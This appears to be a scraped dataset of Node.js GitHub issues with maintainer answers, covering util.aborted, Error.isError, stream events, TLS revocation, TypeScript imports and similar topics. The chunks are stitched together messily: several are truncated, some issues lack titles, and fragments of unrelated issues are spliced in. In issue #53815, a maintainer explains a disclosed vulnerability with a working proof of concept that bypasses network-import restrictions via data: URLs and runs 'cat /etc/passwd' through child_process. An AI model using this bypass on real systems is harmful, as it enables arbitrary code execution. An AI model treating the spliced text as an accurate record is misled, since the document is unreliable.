title: clarification on when/how to use `util.aborted`
chunk_text:
GitHub issue #55340: clarification on when/how to use `util.aborted`
Source: https://github.com/nodejs/node/issues/55340
Final label: docs
GitHub labels: util, doc

Problem summary:
### Affected URL(s)

https://nodejs.org/api/util.html#utilabortedsignal-resource

### Description of the problem

The docs aren't entirely clear on the purpose of the second ~optional~ argument (`resource`), how it's supposed to be used, or when it's useful.  One of the primary use cases for this util function seems to be aborting a promise that doesn't support abort natively, but I'm not sure what I should pass as the resource?

```mjs
import { aborted } from 'node:util';

const ac = new AbortController();
const client = new SomeRandomDatabaseClient();

const results = await Promise.race([
  client.uncancelableQuery(),
  aborted(ac.signal, /* what am i supposed to pass here */),
]);

// somewhere else ac.abort() may or may not ever be called
// but assume ac does go out of scope and get gc'd eventually
```

Am I thinking about this use case correctly, or is not passing resource somehow creating a memory leak / preventing things from being cleaned up properly?

EDIT: It seems I misunderstood the second argument being optional, it appears required, but questions still remain how it's supposed to be used for the example above.

title: Error.isError does not detect legacy Error types using util.inherits
chunk_text:
GitHub issue #62224: Error.isError does not detect legacy Error types using util.inherits
Source: https://github.com/nodejs/node/issues/62224
Final label: question
GitHub labels: question

Problem summary:
Sample REPL output

> \> function CustomError() {}
> undefined
> \> require('util').inherits(CustomError, Error);
> undefined
> \> new CustomError() instanceof Error
> true
> \> Error.isError(CustomError)
> false

### How often does it reproduce? Is there a required condition?

This happens 100% of the time

### What is the expected behavior? Why is that the expected behavior?

`Error.isError` is meant to be a more robust replacement for Error detection vs `instanceof`.  It should work consistently with legacy node patterns `utils.inherits`, without surprise.

### What do you see instead?

`Error.isError` does not detect error types that rely on `utils.inherits` for extension.  `instanceof Error` does still work in these scenarios.

### Additional information

The es-shim, https://github.com/es-shims/Error.isError/blob/main/implementation.js#L64 , has the `instanceof Error` behavior as the final fallback, which would catch this behavior.

Version:
v25.8.0

### Platform

```text
Darwin mac.lan 25.3.0 Darwin Kernel Version 25.3.0: Wed Jan 28 20:55:08 PST 2026; root:xnu-12377.91.3~2/RELEASE_ARM64_T6020 arm64
```

### Subsystem

_No response_

chunk_text:
m/es-shims/Error.isError/blob/main/implementation.js#L64 , has the `instanceof Error` behavior as the final fallback, which would catch this behavior.

Observed behavior:
`Error.isError` does not detect error types that rely on `utils.inherits` for extension.  `instanceof Error` does still work in these scenarios.

The es-shim, https://github.com/es-shims/Error.isError/blob/main/implementation.js#L64 , has the `instanceof Error` behavior as the final fallback, which would catch this behavior.

Maintainer answer / maintainer context:
Renegade334 (MEMBER): [This is specified behaviour](https://sqlite.org/c3ref/interrupt.html):

> `Error.isError()` rejects values that aren't actual `Error` instances, even if they have `Error.prototype` in their prototype chain — `instanceof Error` would accept these as it does check the prototype chain.

This is exactly the same check that `util.types.isNativeError()` performs.

If you are using error objects constructed in that way, then you can't use `Error.isError()` to test for them.

ljharb (MEMBER): The es-shim package is best-effort, and it's unfortunate that it does "catch this behavior" - it shouldn't.

metadata.title: Error.isError does not detect legacy Error types using util.inherits

title: Error.isError does not detect legacy Error types using util.inherits
chunk_text:
ror()` to test for them.

ljharb (MEMBER): The es-shim package is best-effort, and it's unfortunate that it does "catch this behavior" - it shouldn't.

Renegade334 (MEMBER): Ultimately, if you are just trying to detect whether an object is derived from `Error.prototype`, you should be using `instanceof`.

`Error.isError()` is for realm-agnostic detection of objects constructed by the `Error` constructor, which is not the usage case you're describing. It's telling you that the objects you are passing it are not built-in Error objects, which is exactly its purpose.

```

### How often does it reproduce? Is there a required condition?

always

### What is the expected behavior? Why is that the expected behavior?

The expected output of file content will be the same.

### What do you see instead?

The content of the file has changed after being assigned a new name.

### Additional information

_No response_

Expected behavior:
The expected output of file content will be the same.

### What do you see instead?

The content of the file has changed after being assigned a new name.

### Additional information

_No response_

Observed behavior:
The content of the file has changed after being assigned a new name.

### Additional information

_No response_

Additional information:
_No response_

Maintainer answer / maintainer context:
Renegade334 (MEMBER): This is exactly the behaviour dictated by the spec (https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#create-an-entry).

If a new `filename` is provided, then a _new_ File object is created with the specified filename and the same byte data as the input. Because this new object is a File, not a MyFile, it doesn't have your custom methods.

metadata.title: The behavior of FormData.append is quite strange

title: The behavior of FormData.append is quite strange
chunk_text:
with the specified filename and the same byte data as the input. Because this new object is a File, not a MyFile, it doesn't have your custom methods.

If you want your custom File object to be passed through unaltered, you cannot specify a new filename.

title: https.ServerResponse pipe doesn't fully consume the response
chunk_text:
GitHub issue #61881: https.ServerResponse pipe doesn't fully consume the response
Source: https://github.com/nodejs/node/issues/61881
Final label: question
GitHub labels: question

Problem summary:
The following script will fail:

```js
const https = require('https')
const fs = require('fs')
const assert = require('assert')

const url = 'https://storage.googleapis.com/chrome-for-testing-public/145.0.7632.77/mac-arm64/chrome-mac-arm64.zip'

const request = https.request(url, response => {
  const contentLength = response.headers['content-length']
  response.pipe(fs.createWriteStream('test.zip'))
  response.on('end', () => {
    const stats = fs.statSync('test.zip')
    assert.equal(stats.size, contentLength)
  })
})

request.end()
```

### How often does it reproduce? Is there a required condition?

100% of the time.

### What is the expected behavior? Why is that the expected behavior?

No error.

### What do you see instead?

```
AssertionError [ERR_ASSERTION]: 170216693 == '170231101'
    at IncomingMessage.<anonymous> (tmp.js:12:12)
    at IncomingMessage.emit (node:events:520:35)
    at endReadableNT (node:internal/streams/readable:1701:12)
    at process.processTicksAndRejections (node:internal/process/task_queues:89:21) {
  generatedMessage: true,
  code: 'ERR_ASSERTION',
  actual: 170216693,
  expected: '170231101',
  operator: '==',
  diff: 'simple'
}
```

Maintainer answer / maintainer context:
Renegade334 (MEMBER): The correct event to listen to here is the writable stream's `finish` event. As mentioned, the HTTP response emitting `end` does not imply that the pipeline is finished.

Renegade334 (MEMBER): Yes, the `end` event will indeed fire when all of the data have been read ("consumed") from the readable stream. That doesn't imply that streams further down the pipeline have finished processing those data.

title: `ERR_MODULE_NOT_FOUND` when using `node` to run TypeScript that imports an ES Module with `.js` or no extension
chunk_text:
GitHub issue #61229: `ERR_MODULE_NOT_FOUND` when using `node` to run TypeScript that imports an ES Module with `.js` or no extension
Source: https://github.com/nodejs/node/issues/61229
Final label: question
GitHub labels: question, strip-types

Problem summary:
In terminal:
```bash
mkdir test
cd test
```
Create two files (copied from [TypeScript handbook](https://www.typescriptlang.org/docs/handbook/2/modules.html)):
```ts
// hello.ts
export default function helloWorld() {
  console.log("Hello, world!");
}
```
```ts
// main.ts
import helloWorld from "./hello.js";
helloWorld();
```
Then in terminal:
```bash
node main.ts
```

### How often does it reproduce? Is there a required condition?

The bug reproduces if you import `./hello.js` or `./hello`, but not `./hello.ts`.

### What is the expected behavior? Why is that the expected behavior?

I expected the output to be
```
Hello, world!
```
even when `./hello.js` is imported, because the common practice seems to be to specify the `.js` file extension when importing an ES Module. See [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules#importing_features_into_your_script) and [TypeScript](https://www.typescriptlang.org/docs/handbook/2/modules.html#es-module-syntax) docs.

### What do you see instead?

chunk_text:
GitHub issue #16985: Date is wrong
Source: https://github.com/nodejs/node/issues/16985
Final label: question
GitHub labels: question

Problem summary:
Ciao!

How are you?
<!--
Thank you for reporting an issue.

This issue tracker is for bugs and issues found within Node.js core.
If you require more general support please file an issue on our help
repo. https://github.com/nodejs/help

Please fill in as much of the template below as you're able.

Version: output of `node -v`
Platform: output of `uname -a` (UNIX), or version and 32 or 64-bit (Windows)
Subsystem: if known, please specify affected core module name

If possible, please provide code that demonstrates the problem, keeping it as
simple and free of external dependencies as you are able.
-->

* **Version**: 9.1
* **Platform**: Linux
* **Subsystem**: Mint / Ubuntu / Debian

<!-- Enter your issue details below this comment. -->

Chrome:
```js
new Date()
```
![image](https://user-images.githubusercontent.com/28588124/32719937-4b71fc32-c862-11e7-8b47-2f83adf6ae8a.png)

The server:
```bash
date
```
![image](https://user-images.githubusercontent.com/28588124/32719960-5ea0f2cc-c862-11e7-92e1-a94b70e4cc43.png)

With node it shows wrong time (GMT):

![image](https://user-images.githubusercontent.com/28588124/32719988-7852919e-c862-11e7-8b76-6951b0455a8f.png)

It should show ```11``

addaleax (MEMBER): It doesn’t look like there’s anything wrong here? 10:04:33.926Z is the same as 11:03:41 CET, it’s just displayed in a different timezone.

(If you need something that has better built-in support for timezones, you may want to use [moment-timezone](https://momentjs.com/timezone/) instead of the built-in `Date` class)

addaleax (MEMBER): > Why are they different?

They are the same time, they aren’t different, it’s just a question of how they are displayed

addaleax (MEMBER): `new Date().toISOString()` should give you the same result in browsers and Node, if that helps convince you

title: `console.log({ '"\'': 0 })` gives syntactically invalid JS
chunk_text:
GitHub issue #57024: `console.log({ '"\'': 0 })` gives syntactically invalid JS
Source: https://github.com/nodejs/node/issues/57024
Final label: question
GitHub labels: question, util, console

Problem summary:
```js
console.log({ '"\'': 0 })
// logs { `"'`: 0 }
```

However, `` { `"'`: 0 } `` is not syntactically valid in JS:

```js
let x
x = { `"'`: 0 }
// parse error: Unexpected token ```. Expected identifier, string literal, numeric literal or [ for the computed key at 2:7
x = { '"\'': 0 }
// ok
x = { [`"'`]: 0 }
// ok
```

While there's no hard requirement for `console.log` to always yield syntactically invalid JS (e.g. objects such as `File { name: "", size: 0, type: "" }`, truncation with `...`, etc.) I'd generally expect small JSON-compatible objects to be displayed in a way I can directly copy-paste into my code.

For comparison, Deno has [the same issue](https://github.com/denoland/deno/issues/28101), while Bun doesn't.

### How often does it reproduce? Is there a required condition?

Always, given an object with a key that contains both single `'` and double `"` quotes.

### What is the expected behavior? Why is that the expected behavior?

Either `{ '"\'': 0 }`, `{ "\"'": 0 }`, or `` { [`"'`]: 0 } ``

### What do you see instead?

`` { `"'`: 0 } ``

### Additional information

_No response_

Version:
23.3.0

### Platform

BridgeAR (MEMBER): This is intentional for readability reasons in the default case.

I do believe it would be valuable to have a option to generate JSON compatible output (a lot of things generate invalid output). It is just tricky to do that without slowing down the default case and it requires a substaintial change. Not slowing down the average case would for example be possible with a unique implementation, while that has the downside of otherwise not using the same feature set.

Would you be up to try to implement such option? I can't guarantee it would land though.

BridgeAR (MEMBER): I am going to close it since we have many inputs that would not be valid JS.

title: Why https module doesn't make a check for certificate revocation?
chunk_text:
GitHub issue #16338: Why https module doesn't make a check for certificate revocation?
Source: https://github.com/nodejs/node/issues/16338
Final label: question
GitHub labels: question, https

Problem summary:
Hello, didn't find any information and find it weird that https by default doesn't make a check for certificate revocation.
And in fact there's no normal way to do so using standard libraries. IMHO, this check is equally important as any other check, such as trusted CA or expiration date.

P.S. I'm testing on https://revoked.badssl.com, I'd expect that https (tls) module would throw an exception as it does for https://self-signed.badssl.com, for example.

Version:

Platform:

bnoordhuis (MEMBER): > And in fact there's no normal way to do so using standard libraries.

There is, look for the `.crl` option in the `tls` documentation.  You can also enable OCSP stapling.

bnoordhuis (MEMBER): CRLs and OCSP, plain and stapled, have enough practical concerns that turning them on by default is going to lead to widespread fallout.  A good overview: https://www.maikel.pro/blog/current-state-certificate-revocation-crls-ocsp/

em on by default is going to lead to widespread fallout.  A good overview: https://www.maikel.pro/blog/current-state-certificate-revocation-crls-ocsp/

Bundling CRLs with Node.js isn't useful because they would be out-of-date almost immediately (and before anyone asks, download-and-cache is not an option - too many failure modes.)

bnoordhuis (MEMBER): > about problems that I knew about before starting this thread...

If you knew about those problems, then why did you say it was "weird" it's not enabled by default?  Logic error, does not compute.

I'll go ahead and close this out, I think your question has been answered.

title: Can we supress the new experimental warning from the new default require(esm) setting?
chunk_text:
GitHub issue #55417: Can we supress the new experimental warning from the new default require(esm) setting?
Source: https://github.com/nodejs/node/issues/55417
Final label: question
GitHub labels: question, module, esm

Problem summary:
### What is the problem this feature will solve?

I use NVM for Windows.

1. I run `nvm install 23.0.0`
2. `v23.0.0` gets installed.
3. I then run `nvm use 23.0.0`
4. I then run `npm install npm@latest -g`

The latest npm gets installed, but I also get the following output pollution:

```
(node:32728) ExperimentalWarning: Support for loading ES Module in require() is an experimental feature and might change at any time
(Use `node --trace-warnings ...` to show where the warning was created)
```

5. If I then run `npm install svgo -g`, I get the same `ExperimentalWarning` pollution.

Is there any way I can suppress this message by default while still leaving the new default require(esm) setting enabled? I don't want to see this warning every time I install a global package, especially since I am automating things.

This doesn't happen with any node versions prior to 23.0.0.

Appreciate any consideration.

### What is the feature you are proposing to solve the problem?

A global configuration setting to suppress this new warning every time I install a global module in v23.0.0:

<!-- Enter your issue details below this comment. -->

Starting with node 8.6.0, whenever I try to make an https call to an nginx server that I'm running (be it through a library like `request` or using `https.request()` directly), I always get the following error:

```
Error: 101057795:error:14077410:SSL routines:SSL23_GET_SERVER_HELLO:sslv3 alert handshake failure:openssl\ssl\s23_clnt.c:772
```

I'll admit up front that I'm not the most knowledge

```

Reproduction steps:

Expected behavior:

Observed behavior:

Additional information:

Maintainer answer / maintainer context:
bnoordhuis (MEMBER): #15206 is indeed the PR that is responsible for this change.  I assume you don't pass an explicit `ecdhCurve` option to `https.request()`?

It sounds like #15206 slipped in an accidental bug fix because `ecdhCurve` is supposed to default to `tls.DEFAULT_ECDH_CURVE`, which is `prime256v1` at the time of writing.  `secp384r1` shouldn't have worked without a manual override.  Regrettably, we don't seem to have test coverage for that.

@nodejs/security What do we want to do?

bnoordhuis (MEMBER): > As a side note: I actually wasn't aware the ecdhCurve could be passed in to https.request().

It's not completely fool-proof at the moment.  If you make two requests to the same host using the same agent but with different `ecdhCurve` options, one or the other might be ignored.

If you'd like to work on that, the logic is in `https.Agent#getName()` in lib/https.js - it should include the option in the computed key.

metadata.title: SSL Handshake Error using node >= 8.6.0

chunk_text:
e ignored.

If you'd like to work on that, the logic is in `https.Agent#getName()` in lib/https.js - it should include the option in the computed key.

Ideally, every option to `tls.connect()` would be picked up by `https.request()` automatically but I haven't been able to come up with something that is both robust and efficient.

bnoordhuis (MEMBER): > Looking at the options that are already there, I'm thinking it's reasonable to add support for the rest of the tls.createSecureContext() options since they all have serialization-friendly data types and should be reasonably short

@princjef Yes, sounds good.

> Nginx sets ssl_ecdh_curve to auto if it is not specified. How about we do the same?

@rogaps That's an option for v9.x, but not v8.x as that branch has been released, is stable and about to go LTS.  Related issue: #1495

tniessen (MEMBER): This is expected. You are not actually calling `setAutoPadding(false)` but overwriting the function-valued property with the constant `false`, which has no documented effect. If you actually call `setAutoPadding(false)` instead, you should be able to disable padding.

title: Add method for creating blocking async code
chunk_text:
GitHub issue #54400: Add method for creating blocking async code
Source: https://github.com/nodejs/node/issues/54400
Final label: question
GitHub labels: question

Problem summary:
### What is the problem this feature will solve?

It will allow people to resolve race conditions. This is currently impossible when interacting with the filesystem in any way.

### What is the feature you are proposing to solve the problem?

A function that will prevent the currently executing function from continuing to the next line until a promise resolves, without forcing the programmer to make their entire function async

### What alternatives have you considered?

* using a setTimeout to wait for the task to continue, which doesn't work because the amount of time the operation will take is unknown.
* polling the filesystem constantly to make sure that every file is in its correct place before continuing, this fails because memory and CPU usage spikes massively whenever anything is moving
* using fs.cpSync to do the moving, which doesn't work because that function is apparently not actually synchronous in any way.
* Giving up on nodeJS entirely and moving to C#, Java, C++, or Golang, where this feature already exists, which would require me to rewrite my entire codebase.

Version:

Platform:

Subsystem:

Reproduction steps:

Expected behavior:

Observed behavior:

Additional information:

metadata.title: Add method for creating blocking async code

title: Add method for creating blocking async code
chunk_text:
to rewrite my entire codebase.

Version:

Platform:

Subsystem:

Reproduction steps:

Expected behavior:

Observed behavior:

Additional information:

Maintainer answer / maintainer context:
avivkeller (MEMBER): A few questions:
1. Could you provide an example?
2. Is this an issue for Node.js or JavaScript in general. If you have a general JS idea, please refer to TC39.

avivkeller (MEMBER): async API (Promises and similar constructs) is managed by the V8 engine, developed by Google/Chromium. This design adheres to the [Promises specification](https://tc39.es/ecma262/multipage/control-abstraction-objects.html#sec-promise-objects) defined in ECMAScript.

Based on my understanding, this isn't something that can be directly controlled by Node.js, as Node.js doesn't manage this API.

However, there are methods to monitor promises, although it's unclear if they can be used to block the event loop. It might be worth exploring the [`async_hooks`](https://nodejs.org/api/async_hooks.html) module. Additionally, `await` can be used to pause execution until asynchronous code has completed.

Resolution:

Source: https://github.com/nodejs/node/issues/53069
Final label: question
GitHub labels: question

Problem summary:
Create a new Next.js project using the latest version (as of writing, it's Next.js 13.2.4).
In one of the pages , import the Headers object from undici and try to set headers,
let headers = new Headers();
headers.set('Access-Control-Allow-Credentials', true);
headers.set('Access-Control-Allow-Origin', '*');
headers.set('x-auth-token',' process.env.EXAMPLE.TOKEN');

### How often does it reproduce? Is there a required condition?

The issue reproduces consistently when running the above steps with Node.js version 22.2.0.

### What is the expected behavior? Why is that the expected behavior?

The expected behavior is for the Headers object to correctly accept and set the provided header key-value pairs without throwing any errors. This is the expected behavior because the Headers object should handle string values for both header keys and values according to the documentation and specifications.

### What do you see instead?

title: Security question: Why are data: URIs and file: URIs treated differently in your security policy?
chunk_text:
GitHub issue #53815: Security question: Why are data: URIs and file: URIs treated differently in your security policy?
Source: https://github.com/nodejs/node/issues/53815
Final label: question
GitHub labels: question, security

Problem summary:
I noticed [this bug report](https://hackerone.com/reports/2092749) and asked @RafaelGSS why `data:` URIs are treated differently from `file:` URIs in the node.js security policy, as attackers can simply write to a file and then import it to achieve the same effect.

Rafael responded with the following, asking me to file an issue in this bug tracker instead of elaborating on X:

> This vulnerability exposes a vulnerability according to Node.js threat model. I can expand more on that if you raise an issue.
> 
> But I certainly won't elaborate on a X thread :)

Maintainer answer / maintainer context:
avivkeller (MEMBER): @nodejs/security-wg 
CC @RafaelGSS

RafaelGSS (MEMBER): So I couple of things first:

1. The report was disclosed limited, so that's explains why you can only read the summary:

> A security flaw in Node.js allows a bypass of network import restrictions.
By embedding non-network imports in data URLs, an attacker can execute arbitrary code, compromising system security.
Verified on various platforms, the vulnerability is mitigated by forbidding data URLs in network imports.
Exploiting this flaw can violate network import security, posing a risk to developers and servers.

I will try to adjust it either way.

2. I believe your question is unrelated to the vulnerability itself. I will provide more details about the report, but I might not be the best person to explain our resolvers.

Imagine you have an HTTP server with two routes:

metadata.title: Security question: Why are data: URIs and file: URIs treated differently in your security policy?

title: Security question: Why are data: URIs and file: URIs treated differently in your security policy?
chunk_text:
provide more details about the report, but I might not be the best person to explain our resolvers.

Imagine you have an HTTP server with two routes:

1. `/indirect` -> returns a
```
import childProcess from 'data:text/javascript,export { default } from "node:child_process"'
import http from 'data:text/javascript,export { default } from "node:http"'

console.log('BYPASSED')
const data = childProcess.execSync('cat /etc/passwd')
```
2. `/direct` -> returns a `import fs from 'node:fs/promises'`

While the `/direct` route produces the expected result:

```console
$ node --experimental-network-imports --import 'http://127.0.0.1:9999/direct.mjs' --eval ''

Error [ERR_NETWORK_IMPORT_DISALLOWED]: import of 'node:fs/promises' by http://localhost:9999/direct.mjs is not supported: only relative and absolute specifiers are supported.
```

the `/indirect` is a bypass of this feature's expectations

```console
$ node --experimental-network-imports --import 'http://127.0.0.1:9999/indirect.mjs' --eval ''
BYPASS
```

RafaelGSS (MEMBER): Also note, that we are discussing removing this feature entirely https://github.com/nodejs/node/pull/53822.

Resolution:
Resolution type: maintainer_answer
Fix summary:

Linked PRs:

Fix commits:

metadata.title: Security question: Why are data: URIs and file: URIs treated differently in your security policy?

title: Clarification Needed: require('http') and require('node:http') with existing require.cache entries
chunk_text:
GitHub issue #52970: Clarification Needed: require('http') and require('node:http') with existing require.cache entries
Source: https://github.com/nodejs/node/issues/52970
Final label: question
GitHub labels: question, doc, loaders

Problem summary:
### Affected URL(s)

https://nodejs.org/docs/latest-v20.x/api/modules.html#core-modules

### Description of the problem

According to the [documentation](https://nodejs.org/docs/latest-v20.x/api/modules.html#core-modules):

>Core modules can be identified using the node: prefix, in which case it bypasses the require cache. For instance, require('node:http') will always return the built in HTTP module, even if there is require.cache entry by that name"

And:

>Some core modules are always preferentially loaded if their identifier is passed to require(). For instance, require('http') will always return the built-in HTTP module, even if there is a file by that name."

Given this, if require('http') always returns the built-in HTTP module, under what circumstances would a require.cache entry by that name exist, making it necessary to use require('node:http')?

Version:

Platform:

Subsystem:

Reproduction steps:

Expected behavior:

Observed behavior:

Final label: question

Problem summary:
<!--
Thank you for reporting an issue.

This issue tracker is for bugs and issues found within Node.js core.
If you require more general support please file an issue on our help
repo. https://github.com/nodejs/help

Please fill in as much of the template below as you're able.

Version: output of `node -v`
Platform: output of `uname -a` (UNIX), or version and 32 or 64-bit (Windows)
Subsystem: if known, please specify affected core module name

If possible, please provide code that demonstrates the problem, keeping it as
simple and free of external dependencies as you are able.
-->

* **Version**: v9.4.0
* **Platform**: Darwin
* **Subsystem**: url

<!-- Enter your issue details below this comment. -->

I want to join url href just like path.join, examples

```js
url.join('http://nodejs.org', 'dist', 'download') === 'http://nodejs.org/dist/download'
url.join('http://nodejs.org/dist', 'download') === 'http://nodejs.org/dist/download'
url.resolve('http://nodejs.org/dist', 'download') === 'http://nodejs.org/download'
url.join('http://nodejs.org/dist/', '/download') === 'http://nodejs.org/dist/download'
url.join('http://nodejs.org/dist', 'http://mirror.nodejs.org/dist') === 'http://mirro

Version:

title: Feature request: url.join(baseUrl, ...others)
chunk_text:
/', '/download') === 'http://nodejs.org/dist/download'
url.join('http://nodejs.org/dist', 'http://mirror.nodejs.org/dist') === 'http://mirro

Version:

Platform:

Subsystem:

Reproduction steps:

Expected behavior:

Observed behavior:

Additional information:

Maintainer answer / maintainer context:
TimothyGu (MEMBER): How does this differ from `[baseUrl, ...others].join('/')`?

In any case, we are trying to move away from legacy URL APIs like `url.resolve()` in favor of the [WHATWG standard-compliant API](https://nodejs.org/api/url.html#url_the_whatwg_url_api). We probably will not consider this addition.

TimothyGu (MEMBER): `http://nodejs.org//foo/bar//baz/` is a valid URL that may have a different meaning from `http://nodejs.org/foo/bar/baz/`. It would be semantically incorrect to disallow this distinction.

Resolution:

Fix summary: Linked PR #6: Allow canonical_base to contain a path
